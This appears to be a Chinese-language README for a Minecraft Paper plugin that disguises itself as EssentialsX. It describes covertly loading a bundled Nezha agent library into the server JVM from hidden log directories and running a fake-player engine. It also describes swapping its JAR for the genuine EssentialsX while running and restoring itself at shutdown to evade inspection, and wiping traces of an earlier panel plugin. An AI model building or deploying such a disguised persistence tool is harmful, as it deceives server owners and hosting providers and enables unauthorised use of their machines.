# ceshisonz

伪装成 EssentialsX 的 Paper 插件，只做三件事，没有任何 Node 部署：

1. **哪吒监控**：启动完成 14 秒后，通过 JNA 在服务器 JVM 内启动内置编译的哪吒 agent（`logs/.mcchajian/.runtime/libraries/` 下的 `nezha_agent_linux_amd64/arm64.so`，从本仓库 Release 下载、哈希校验）。
2. **内置假人**：同一时刻启动编译进 JAR 的 FakePlayerEngine，不需要下载任何东西。
3. **官方插件替换还原**：假人起来之后，把当前插件 JAR 备份到 `logs/.mcchajian/.runtime/backup/*.bak`，下载官方 `EssentialsX-2.21.2.jar`（先走 `mirror.ghproxy.com`，失败或小于 1MB 再直连 GitHub，>1MB 才接受）原子覆盖到 plugins 目录；停服（onDisable）第一时间删掉官方包、把备份拷回去，下次启动重新加载本插件，循环往复。

时序：**启动完成 → 等 14 秒 → 哪吒.so → 假人 → 替换生效；停服 → 立即还原**。

## 启动清理

插件启动时自动删除上一代面板插件留下的 Node 运行时残留：整个 `cache/.vip`，以及 `logs/.mcchajian` 下本插件不用的所有内容（nodejs/、app/、日志、隧道状态等）。只保留：

- `logs/.mcchajian/.env` — 私有配置
- `logs/.mcchajian/.runtime/libraries/` — 哪吒 .so
- `logs/.mcchajian/.runtime/backup/` — 替换用的插件备份

## 注意

- 进程被 `kill -9`/断电时还原不会执行，plugins 目录会留在官方包上；正常 `/stop`、`/reload`、面板重启都走还原。
- 升级本插件前先删掉 `backup/*.bak`，否则停服还原会把旧版拷回来。
- 配置与内置哪吒默认值见 `docs/builtin-nezha.md`；替换细节见 `docs/jar-disguise.md`。
